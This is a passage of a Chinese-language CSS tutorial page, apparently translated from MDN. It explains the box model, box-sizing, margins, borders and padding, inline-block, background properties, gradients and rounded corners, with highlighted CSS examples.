当然，它会影响盒子在页面所占空间，但是影响的是盒子外部空间。盒子的范围到边框为止 —— 不会延伸到 margin。</p><p><strong>替代（IE）盒模型</strong></p><p>你可能会认为盒子的大小还要加上边框和内边距，这样很麻烦，而且你的想法是对的 ! 因为这个原因，css 还有一个替代盒模型。使用这个模型，所有宽度都是可见宽度，所以内容宽度是该宽度减去边框和填充部分。使用上面相同的样式得到 (width &#x3D; 350px, height &#x3D; 150px).</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/The_box_model/alternate-box-model.png" alt="Showing the size of the box when the alternate box model is being used."></p><p>默认浏览器会使用标准模型。如果需要使用替代模型，您可以通过为其设置 <code>box-sizing: border-box</code> 来实现。这样就可以告诉浏览器使用 <code>border-box</code> 来定义区域，从而设定您想要的大小。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.<span class="hljs-built_in">box</span> &#123;<br>  <span class="hljs-built_in">box</span>-sizing: <span class="hljs-built_in">border</span>-<span class="hljs-built_in">box</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你希望所有元素都使用替代模式，而且确实很常用，设置 <code>box-sizing</code> 在 <code>&lt;html&gt;</code> 元素上，然后设置所有元素继承该属性，正如下面的例子。如果想要深入理解，请看 <a href="https://css-tricks.com/inheriting-box-sizing-probably-slightly-better-best-practice/">the CSS Tricks article on box-sizing</a>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>&#125;<br>*, *<span class="hljs-selector-pseudo">::before</span>, *<span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: inherit;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 一个有趣的历史记录 ——Internet Explorer 默认使用替代盒模型，没有可用的机制来切换。（译者注：IE8+ 支持使用 <code>box-sizing</code> 进行切换）</p><h4 id="外边距，内边距，边框"><a href="#外边距，内边距，边框" class="headerlink" title="外边距，内边距，边框"></a><strong>外边距，内边距，边框</strong></h4><p>您已经在上面的示例中看到了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding"><code>padding</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a>属性。该示例中使用的是属性的<strong>简写</strong>，允许我们一次设置盒子的四个边。这些简写等价于分别控制盒子的不同边的普通写法。</p><p>接下来，我们更详细地研究这些属性：</p><p><strong>外边距</strong></p><p>外边距是盒子周围一圈看不到的空间。它会把其他元素从盒子旁边推开。外边距属性值可以为正也可以为负。设置负值会导致和其他内容重叠。无论使用标准模型还是替代模型，外边距总是在计算可见部分后额外添加。</p><p>我们可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a>属性一次控制一个元素的所有边距，或者每边单独使用等价的普通属性控制：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-top"><code>margin-top</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-right"><code>margin-right</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-bottom"><code>margin-bottom</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-left"><code>margin-left</code></a></li></ul><p><strong>边框</strong></p><p>边框是在边距和填充框之间绘制的。如果您正在使用标准的盒模型，边框的大小将添加到框的宽度和高度。如果您使用的是替代盒模型，那么边框的大小会使内容框更小，因为它会占用一些可用的宽度和高度。</p><p>为边框设置样式时，有大量的属性可以使用——有四个边框，每个边框都有样式、宽度和颜色，我们可能需要对它们进行操作。</p><p>可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a>属性一次设置所有四个边框的宽度、颜色和样式。</p><p>分别设置每边的宽度、颜色和样式，可以使用：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-top"><code>border-top</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-right"><code>border-right</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom"><code>border-bottom</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-left"><code>border-left</code></a></li></ul><p>设置所有边的颜色、样式或宽度，请使用以下属性：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-width"><code>border-width</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-style"><code>border-style</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-color"><code>border-color</code></a></li></ul><p>设置单边的颜色、样式或宽度，可以使用最细粒度的普通属性之一：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-top-width"><code>border-top-width</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-top-style"><code>border-top-style</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-top-color"><code>border-top-color</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-right-width"><code>border-right-width</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-right-style"><code>border-right-style</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-right-color"><code>border-right-color</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom-width"><code>border-bottom-width</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom-style"><code>border-bottom-style</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom-color"><code>border-bottom-color</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-left-width"><code>border-left-width</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-left-style"><code>border-left-style</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-left-color"><code>border-left-color</code></a></li></ul><p><strong>设置边框的颜色、样式或宽度，可以使用最细粒度的普通属性或者简写属性。在下面的示例中，我们使用了各种普通属性或者简写属性来创建边框。尝试一下不同的属性，以检查您是否理解它们是如何工作的。MDN 中的边框属性页面为您提供可用的不同边框样式的信息。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">5px</span> dotted green;<br>  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">1px</span> solid black;<br>  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">20px</span> double <span class="hljs-built_in">rgb</span>(<span class="hljs-number">23</span>,<span class="hljs-number">45</span>,<span class="hljs-number">145</span>);<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#333333</span>;<br>  <span class="hljs-attribute">border-top-style</span>: dotted;<br>  <span class="hljs-attribute">border-right-width</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border-bottom-color</span>: hotpink;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>内边距</strong></p><p>内边距位于边框和内容区域之间。与外边距不同，您不能有负数量的内边距，所以值必须是 0 或正的值。应用于元素的任何背景都将显示在内边距后面，内边距通常用于将内容推离边框。</p><p>我们可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding"><code>padding</code></a>简写属性控制元素所有边，或者每边单独使用等价的普通属性：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-top"><code>padding-top</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-right"><code>padding-right</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-bottom"><code>padding-bottom</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-left"><code>padding-left</code></a></li></ul><p><strong>盒子模型和内联盒子</strong></p><p>以上所有的方法都完全适用于块级盒子。有些属性也可以应用于内联盒子，例如由<code>&lt;span&gt;</code>元素创建的那些内联盒子。</p><p>在下面的示例中，我们在一个段落中使用了<code>&lt;span&gt;</code>，并对其应用了宽度、高度、边距、边框和内边距。可以看到，宽度和高度被忽略了。外边距、内边距和边框是生效的，但它们不会改变其他内容与内联盒子的关系，因此内边距和边框会与段落中的其他单词重叠。</p><p><strong>使用 display: inline-block</strong></p><p>display 有一个特殊的值，它在内联和块之间提供了一个中间状态。这对于以下情况非常有用：您不希望一个项切换到新行，但希望它可以设定宽度和高度，并避免上面看到的重叠。</p><p>一个元素使用 <code>display: inline-block</code>，实现我们需要的块级的部分效果：</p><ul><li>设置<code>width</code> 和<code>height</code> 属性会生效。</li><li><code>padding</code>, <code>margin</code>, 以及<code>border</code> 会推开其他元素。</li></ul><p>但是，它不会跳转到新行，如果显式添加 <code>width</code> 和 <code>height</code> 属性，它只会变得比其内容更大。</p><p>当您想要通过添加内边距使链接具有更大的命中区域时，这是很有用的。<code>&lt;a&gt;</code> 是像 <code>&lt;span&gt;</code> 一样的内联元素；你可以使用 <code>display: inline-block</code> 来设置内边距，让用户更容易点击链接。</p><p>这种情况在导航栏中很常见。下面的导航使用 flexbox 显示在一行中，我们为 <code>&lt;a&gt;</code> 元素添加了内边距，因为我们希望能够在 <code>&lt;a&gt;</code> 在鼠标移动到上面时改变背景色。内边距似乎覆盖了 <code>&lt;ul&gt;</code> 元素上的边框。这是因为 <code>&lt;a&gt;</code> 是一个内联元素。</p><p>使用 <code>.links-list a</code> 选择器将 <code>display: inline-block</code> 添加到样式规则中，你将看到它是如何通过内边距推开其他元素来修复这个问题的。</p><p>这就是你需要了解的关于盒子模型的大部分内容。如果以后你发现对于盒模型的布局仍有困惑，你将会回来温故这些内容。</p><h3 id="2-3-背景与边框"><a href="#2-3-背景与边框" class="headerlink" title="2.3 背景与边框"></a>2.3 背景与边框</h3><p>在这节课中，我们来看看，使用 CSS 背景和边框来做一些，具有一些创造性的事情。渐变、背景图像和圆角，背景和边框的巧妙运用是 CSS 中许多样式问题的答案。</p><h4 id="css的背景样式"><a href="#css的背景样式" class="headerlink" title="css的背景样式"></a>css的背景样式</h4><p>CSS <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 属性是我们将在本课中学习的许多普通背景属性的简写。如果您在样式表中发现了一个复杂的背景属性，可能会觉得难以理解，因为可以同时传入这么多值。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">105deg</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,.<span class="hljs-number">2</span>) <span class="hljs-number">39%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">1</span>) <span class="hljs-number">96%</span>) center center / <span class="hljs-number">400px</span> <span class="hljs-number">200px</span> no-repeat,<br>  <span class="hljs-built_in">url</span>(<span class="hljs-string">big-star.png</span>) center no-repeat, rebeccapurple;<br>&#125;<br></code></pre></td></tr></table></figure><p>在本教程的后面部分，我们将返回到简写的工作方式，但是首先，我们通过分开使用各个普通背景属性的方式，看一下在 CSS 中使用背景可以做哪些不同的事情。</p><p><strong>背景颜色</strong></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-color"><code>background-color</code></a> 属性定义了 CSS 中任何元素的背景颜色。属性接受任何有效的<code>&lt;color&gt;值</code>。背景色扩展到元素的内容和内边距的下面。</p><p><strong>背景图片</strong></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-image"><code>background-image</code></a> 属性允许在元素的背景中显示图像。在下面的例子中，我们有两个方框——一个是比方框大的背景图像，另一个是星星的小图像。</p><p><strong>如果除了背景图像外，还指定了背景颜色，则图像将显示在颜色的顶部。</strong></p><h4 id="控制背景平铺"><a href="#控制背景平铺" class="headerlink" title="控制背景平铺"></a><strong>控制背景平铺</strong></h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-repeat"><code>background-repeat</code></a> 属性用于控制图像的平铺行为。可用的值是：</p><ul><li><code>no-repeat</code> — 不重复。</li><li><code>repeat-x</code> —水平重复。</li><li><code>repeat-y</code> —垂直重复。</li><li><code>repeat</code> — 在两个方向重复。</li></ul><h4 id="调整背景图像的大小"><a href="#调整背景图像的大小" class="headerlink" title="调整背景图像的大小"></a><strong>调整背景图像的大小</strong></h4><p>在上面的例子中，我们有一个很大的图像，由于它比作为背景的元素大，所以最后被裁剪掉了。在这种情况下，我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-size"><code>background-size</code></a>属性，它可以设置长度或百分比值，来调整图像的大小以适应背景。</p><p>你也可以使用关键字：</p><ul><li><code>cover</code> —浏览器将使图像足够大，使它完全覆盖了盒子区，同时仍然保持其高宽比。在这种情况下，有些图像可能会跳出盒子外</li><li><code>contain</code> — 浏览器将使图像的大小适合盒子内。在这种情况下，如果图像的长宽比与盒子的长宽比不同，则可能在图像的任何一边或顶部和底部出现间隙。</li></ul><p>在下面的例子中，我使用了上面例子中的大图，并使用长度单位来调整方框内的大小。你可以看到这扭曲了图像。</p><p>试试下面：</p><ul><li>改变用于修改背景大小的长度单位。</li><li>去掉长度单位，看看使用<code>background-size: cover</code> or <code>background-size: contain</code>会发生什么。</li><li>如果您的图像小于盒子，您可以更改 background-repeat 的值来重复图像。</li></ul><h4 id="背景图像定位"><a href="#背景图像定位" class="headerlink" title="背景图像定位"></a><strong>背景图像定位</strong></h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-position"><code>background-position</code></a> 属性允许您选择背景图像显示在其应用到的盒子中的位置。它使用的坐标系中，框的左上角是 (0,0)，框沿着水平 (x) 和垂直 (y) 轴定位。</p><p><strong>备注：</strong> 默认的背景位置值是 (0,0)。</p><p>最常见的背景位置值有两个单独的值——一个水平值后面跟着一个垂直值。</p><p>你可以使用像<code>top</code>和<code>right</code>这样的关键字 (在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-image"><code>background-image</code></a> 页面上查找其他的关键字):</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.png</span>);<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-position</span>: top center;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/length">长度值</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/percentage">百分比</a>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.png</span>);<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-position</span>: <span class="hljs-number">20px</span> <span class="hljs-number">10%</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>你也可以混合使用关键字，长度值以及百分比，例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.png</span>);<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-position</span>: top <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，您还可以使用 4-value 语法来指示到盒子的某些边的距离——在本例中，长度单位是与其前面的值的偏移量。所以在下面的 CSS 中，我们将背景从顶部调整 20px，从右侧调整 10px:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">star.png</span>);<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-position</span>: top <span class="hljs-number">20px</span> right <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="渐变背景"><a href="#渐变背景" class="headerlink" title="渐变背景"></a><strong>渐变背景</strong></h4><p>当渐变用于背景时，也可以使用像图像一样的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-image"><code>background-image</code></a> 属性设置。</p><p>您可以在 MDN 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/gradient">&#96;&#96;</a> 数据类型页面上，了解更多关于渐变的不同类型，以及使用它们可以做的事情。使用渐变的一个有趣方法是，使用 web 上可用的许多 CSS 渐变生成器之一，比如<a href="https://cssgradient.io/">这个</a>。您可以创建一个渐变，然后复制并粘贴生成它的源代码。</p><p>在下面的示例中尝试一些不同的渐变。在这两个盒子里，我们分别有一个线性梯度，它延伸到整个盒子上，还有一个径向梯度，它有一个固定的大小，因此会重复。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.a</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">105deg</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">249</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1</span>) <span class="hljs-number">39%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">1</span>) <span class="hljs-number">96%</span>);<br>&#125;<br><br><span class="hljs-selector-class">.b</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">radial-gradient</span>(circle, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">249</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1</span>) <span class="hljs-number">39%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">1</span>) <span class="hljs-number">96%</span>);<br>  <span class="hljs-attribute">background-size</span>: <span class="hljs-number">100px</span> <span class="hljs-number">50px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="多个背景图像"><a href="#多个背景图像" class="headerlink" title="多个背景图像"></a><strong>多个背景图像</strong></h4><p>也可以有多个背景图像——在单个属性值中指定多个 <code>background-image</code> 值，用逗号分隔每个值。</p><p>当你这样做时，你可能会以背景图像互相重叠而告终。背景将与最后列出的背景图像层在堆栈的底部，背景图像在代码列表中最先出现的在顶端。</p><p>其它 <code>background-*</code> 属性，该属性值用逗号分隔的方式设置。例如下列 <code>background-image</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">image1.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image2.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image3.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image4.png</span>);<br><span class="hljs-attribute">background-repeat</span>: no-repeat, repeat-x, repeat;<br><span class="hljs-attribute">background-position</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>,  top right;<br></code></pre></td></tr></table></figure><p>不同属性的每个值，将与其他属性中相同位置的值匹配。例如，上面的 image1 的 <code>background-repeat</code> 值将是 <code>no-repeat</code>。但是，当不同的属性具有不同数量的值时，会发生什么情况呢？答案是较小数量的值会循环—在上面的例子中有四个背景图像，但是只有两个背景位置值。前两个位置值将应用于前两个图像，然后它们将再次循环—image3 将被赋予第一个位置值，image4 将被赋予第二个位置值。</p><h4 id="背景附加"><a href="#背景附加" class="headerlink" title="背景附加"></a><strong>背景附加</strong></h4><p>另一个可供选择的背景是指定他们如何滚动时，内容滚动。这是由 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-attachment"><code>background-attachment</code></a> 属性控制的，它可以接受以下值：</p><ul><li><code>scroll</code>: 使元素的背景在页面滚动时滚动。如果滚动了元素内容，则背景不会移动。实际上，背景被固定在页面的相同位置，所以它会随着页面的滚动而滚动。</li><li><code>fixed</code>: 使元素的背景固定在视图端口上，这样当页面或元素内容滚动时，它就不会滚动。它将始终保持在屏幕上相同的位置。</li><li><code>local</code>: 这个值是后来添加的 (它只在 Internet Explorer 9+中受支持，而其他的在 IE4+中受支持)，因为滚动值相当混乱，在很多情况下并不能真正实现您想要的功能。局部值将背景固定在设置的元素上，因此当您滚动元素时，背景也随之滚动。</li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-attachment"><code>background-attachment</code></a> 属性只有在有内容要滚动时才会有效果，所以我们做了一个示例来演示这三个值之间的区别——看看 <a href="https://mdn.github.io/learning-area/css/styling-boxes/backgrounds/background-attachment.html">background-attachment.html</a> (或者看看这儿的 <a href="https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds">源代码</a>))。</p><h4 id="使用-background-的简写"><a href="#使用-background-的简写" class="headerlink" title="使用 background 的简写"></a><strong>使用 background 的简写</strong></h4><p>正如我在本课开始时提到的，您将经常看到使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 属性指定的背景。这种简写允许您一次设置所有不同的属性。</p><p>如果使用多个背景，则需要为第一个背景指定所有普通属性，然后在逗号后面添加下一个背景。在下面的例子中，我们有一个渐变，它指定大小和位置，然后是一个无重复的图像背景，它指定位置，然后是一个颜色。</p><p>这里有一些规则，需要在简写背景属性时遵循，例如：</p><ul><li><code>background-color</code> 只能在逗号之后指定。</li><li><code>background-size</code> 值只能包含在背景位置之后，用’&#x2F;‘字符分隔，例如：<code>center/80%</code>。</li></ul><p>查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 的 MDN 页面，以查看所有的注意事项。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background</span>:   <br>    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">105deg</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,.<span class="hljs-number">2</span>) <span class="hljs-number">39%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">1</span>) <span class="hljs-number">96%</span>) center center / <span class="hljs-number">400px</span> <span class="hljs-number">200px</span> no-repeat,<br><span class="hljs-built_in">url</span>(<span class="hljs-string">big-star.png</span>) center no-repeat, <br>    rebeccapurple;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>背景的无障碍考虑</strong></p><p>当你把文字放在背景图片或颜色上面时，你应该注意你有足够的对比度让文字对你的访客来说是清晰易读的。如果指定了一个图像，并且文本将被放置在该图像的顶部，您还应该指定一个<code>background-color</code> ，以便在图像未加载时文本也足够清晰。</p><p>屏幕阅读者不能解析背景图像，因此背景图片应该只是纯粹的装饰；任何重要的内容都应该是 HTML 页面的一部分，而不是包含在背景中。</p><h4 id="边框"><a href="#边框" class="headerlink" title="边框"></a><strong>边框</strong></h4><p>在学习盒子模型时，我们发现了边框如何影响盒子的大小。在这节课中，我们将看看如何创造性地使用边界。通常，当我们使用 CSS 向元素添加边框时，我们使用一个简写属性在一行 CSS 中设置边框的颜色、宽度和样式。我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a> 为一个框的所有四个边设置边框。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者我们可以只设置盒子的一个边，例如：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">.<span class="hljs-keyword">box </span>&#123;<br>  <span class="hljs-keyword">border-top: </span><span class="hljs-number">1</span>px solid <span class="hljs-keyword">black;</span><br><span class="hljs-keyword"></span>&#125;<br></code></pre></td></tr></table></figure><p>这些简写的等价于：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.<span class="hljs-built_in">box</span> &#123;<br>  <span class="hljs-built_in">border</span>-<span class="hljs-built_in">width</span>: 1px;<br>  <span class="hljs-built_in">border</span>-<span class="hljs-built_in">style</span>: solid;<br>  <span class="hljs-built_in">border</span>-<span class="hljs-built_in">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以使用更加细粒度的属性：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.<span class="hljs-built_in">box</span> &#123;<br>  <span class="hljs-built_in">border</span>-top-<span class="hljs-built_in">width</span>: 1px;<br>  <span class="hljs-built_in">border</span>-top-<span class="hljs-built_in">style</span>: solid;<br>  <span class="hljs-built_in">border</span>-top-<span class="hljs-built_in">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 这些顶部、右侧、底部和左侧边框属性还具有与文档写入模式相关的映射逻辑属性 (例如，从左到右或从右到左的文本，或从上到下)。在下一课中，我们将探讨这些问题，这包括处理不同的文本指示 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Handling_different_text_directions">详情</a>。</p><h4 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a><strong>圆角</strong></h4><p>通过使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-radius"><code>border-radius</code></a> 属性和与方框的每个角相关的长边来实现方框的圆角。可以使用两个长度或百分比作为值，第一个值定义水平半径，第二个值定义垂直半径。在很多情况下，您将只传递一个值，这两个值都将使用。</p><p>例如，要使一个盒子的四个角都有 10px 的圆角半径：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.<span class="hljs-built_in">box</span> &#123;<br>  <span class="hljs-built_in">border</span>-<span class="hljs-built_in">radius</span>: 10px;<br>&#125;<br></code></pre></td></tr></table></figure><p>或使右上角的水平半径为 1em，垂直半径为 10％：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.<span class="hljs-built_in">box</span> &#123;<br>  <span class="hljs-built_in">border</span>-top-right-<span class="hljs-built_in">radius</span>: 1em <span class="hljs-number">10</span><span class="hljs-symbol">%</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在下面的示例中设置了所有四个角，然后更改右上角的值使之不同。您可以使用这些值来更改圆角样式。查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-radius"><code>border-radius</code></a> 的属性页，查看可用的语法选项。</p><h3 